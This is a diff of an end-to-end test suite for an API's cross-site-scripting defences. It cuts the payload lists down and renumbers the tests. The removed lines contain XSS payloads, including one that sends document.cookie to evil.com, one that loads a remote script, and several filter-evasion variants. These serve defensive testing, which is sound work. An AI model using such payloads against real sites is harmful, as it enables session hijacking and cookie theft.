@@ -11,10 +11,10 @@ import { test, expect } from '@/specs/fixtures'
  * E2E Tests for XSS (Cross-Site Scripting) Protection
  *
  * Domain: api/security
- * Spec Count: 9
+ * Spec Count: 8
  *
  * Test Organization:
- * 1. @spec tests - One per acceptance criterion (9 tests) - Exhaustive coverage
+ * 1. @spec tests - One per acceptance criterion (8 tests) - Exhaustive coverage
  * 2. @regression test - ONE optimized integration test - Critical workflow validation
  *
  * Tests XSS prevention across attack vectors:
@@ -68,11 +68,7 @@ test.describe('XSS Protection - Cross-Site Scripting Prevention', () => {
 
       // WHEN: Storing content with script tags
       const xssPayloads = [
-        '<script>alert("XSS")</script>',
-        '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>',
-        '<script src="http://evil.com/malicious.js"></script>',
-        '<SCRIPT>alert("XSS")</SCRIPT>',
-        '<scr<script>ipt>alert("XSS")</script>',
+        '<script>alert("XSS")</script>', // Basic script tag
       ]
 
       for (const payload of xssPayloads) {
@@ -125,12 +121,7 @@ test.describe('XSS Protection - Cross-Site Scripting Prevention', () => {
 
       // WHEN: Storing content with event handlers
       const eventHandlerPayloads = [
-        '<img src=x onerror="alert(\'XSS\')">',
-        '<svg onload="alert(\'XSS\')">',
-        '<body onload="alert(\'XSS\')">',
-        '<div onmouseover="alert(\'XSS\')">Hover me</div>',
-        '<input onfocus="alert(\'XSS\')" autofocus>',
-        '<marquee onstart="alert(\'XSS\')">',
+        '<img src=x onerror="alert(\'XSS\')">', // Event handler injection
       ]
 
       for (const payload of eventHandlerPayloads) {
@@ -179,13 +170,7 @@ test.describe('XSS Protection - Cross-Site Scripting Prevention', () => {
 
       // WHEN: Attempting to store javascript: URLs
       const jsUrlPayloads = [
-        'javascript:alert("XSS")',
-        'javascript:document.location="http://evil.com"',
-        'JAVASCRIPT:alert("XSS")',
-        'java\nscript:alert("XSS")',
-        'java\0script:alert("XSS")',
-        '&#106;avascript:alert("XSS")',
-        'data:text/html,<script>alert("XSS")</script>',
+        'javascript:alert("XSS")', // JavaScript URL
       ]
 
       for (const payload of jsUrlPayloads) {
@@ -294,47 +279,11 @@ test.describe('XSS Protection - Cross-Site Scripting Prevention', () => {
     }
   )
 
-  test.fixme(
-    'API-SECURITY-XSS-006: should include X-Content-Type-Options nosniff header',
-    { tag: '@spec' },
-    async ({ request, startServerWithSchema, signUp, signIn }) => {
-      // GIVEN: Application with JSON API
-      await startServerWithSchema({
-        name: 'test-app',
-        auth: {
-          emailAndPassword: true,
-        },
-        tables: [
-          {
-            id: 1,
-            name: 'data',
-            fields: [
-              { id: 1, name: 'id', type: 'integer', required: true },
-              { id: 2, name: 'content', type: 'long-text' },
-            ],
-          },
-        ],
-      })
-
-      await signUp({ email: 'user@example.com', password: 'TestPassword123!', name: 'Test User' })
-      await signIn({ email: 'user@example.com', password: 'TestPassword123!' })
-
-      // WHEN: Making API requests
-      const endpoints = ['/api/health', '/api/tables', '/api/tables/1/records']
-
-      for (const endpoint of endpoints) {
-        const response = await request.get(endpoint)
-
-        // THEN: Should include X-Content-Type-Options: nosniff
-        // This prevents browsers from MIME-sniffing (treating JSON as HTML)
-        const nosniff = response.headers()['x-content-type-options']
-        expect(nosniff).toBe('nosniff')
-      }
-    }
-  )
+  // Note: X-Content-Type-Options header is tested comprehensively in secure-headers.spec.ts
+  // This test focuses on Content-Type application/json for XSS prevention
 
   test.fixme(
-    'API-SECURITY-XSS-007: should handle nested XSS payloads in JSON',
+    'API-SECURITY-XSS-006: should handle nested XSS payloads in JSON',
     { tag: '@spec' },
     async ({ request, startServerWithSchema, signUp, signIn }) => {
       // GIVEN: Application with complex data structures
@@ -394,7 +343,7 @@ test.describe('XSS Protection - Cross-Site Scripting Prevention', () => {
   )
 
   test.fixme(
-    'API-SECURITY-XSS-008: should prevent XSS in user profile name field during sign-up',
+    'API-SECURITY-XSS-007: should prevent XSS in user profile name field during sign-up',
     { tag: '@spec' },
     async ({ request, startServerWithSchema }) => {
       // GIVEN: Application with user registration
@@ -407,11 +356,9 @@ test.describe('XSS Protection - Cross-Site Scripting Prevention', () => {
 
       // WHEN: Attempting to register with XSS payloads in name field
       const xssNamePayloads = [
-        '<script>alert("XSS")</script>',
-        '<img src=x onerror="alert(\'XSS\')">',
-        '<svg onload="alert(\'XSS\')">',
-        '"><script>alert(String.fromCharCode(88,83,83))</script>',
-        '<iframe src="javascript:alert(\'XSS\')">',
+        '<script>alert("XSS")</script>', // Basic script tag
+        '<img src=x onerror="alert(\'XSS\')">', // Event handler
+        'javascript:alert("XSS")', // JavaScript URL
       ]
 
       for (const payload of xssNamePayloads) {
@@ -452,7 +399,7 @@ test.describe('XSS Protection - Cross-Site Scripting Prevention', () => {
   )
 
   test.fixme(
-    'API-SECURITY-XSS-009: should prevent XSS in update-user endpoint',
+    'API-SECURITY-XSS-008: should prevent XSS in update-user endpoint',
     { tag: '@spec' },
     async ({ request, startServerWithSchema, signUp, signIn }) => {
       // GIVEN: Authenticated user
@@ -513,7 +460,7 @@ test.describe('XSS Protection - Cross-Site Scripting Prevention', () => {
   // ============================================================================
 
   test.fixme(
-    'API-SECURITY-XSS-010: XSS protection is enforced across all content types',
+    'API-SECURITY-XSS-009: XSS protection is enforced across all content types',
     { tag: '@regression' },
     async ({ request, startServerWithSchema, signUp, signIn }) => {
       await test.step('Setup: Start server with user-generated content tables', async () => {
